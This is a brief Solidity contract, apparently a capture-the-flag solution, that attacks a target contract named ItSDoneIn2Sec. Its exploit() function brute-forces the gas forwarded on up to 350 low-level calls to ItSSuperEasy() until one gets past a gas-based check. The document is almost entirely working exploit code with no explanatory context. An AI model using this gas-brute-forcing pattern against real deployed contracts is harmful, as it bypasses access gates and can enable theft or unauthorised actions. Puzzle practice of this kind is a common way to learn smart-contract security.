contract ByPassItsDoneIn2Sec {
    
    ItSDoneIn2Sec originalContract;
    
    constructor(address payable _originalContract) public {
        originalContract =ItSDoneIn2Sec(_originalContract);
    }
    
    function exploit() public {
        for (uint256 i = 0; i < 350; i++) {
            (bool ret, bytes memory data) = address(originalContract).call.gas(i + 984*3)(abi.encodeWithSignature('ItSSuperEasy()'));
            if (ret)
                break;
        }
    }
    
}
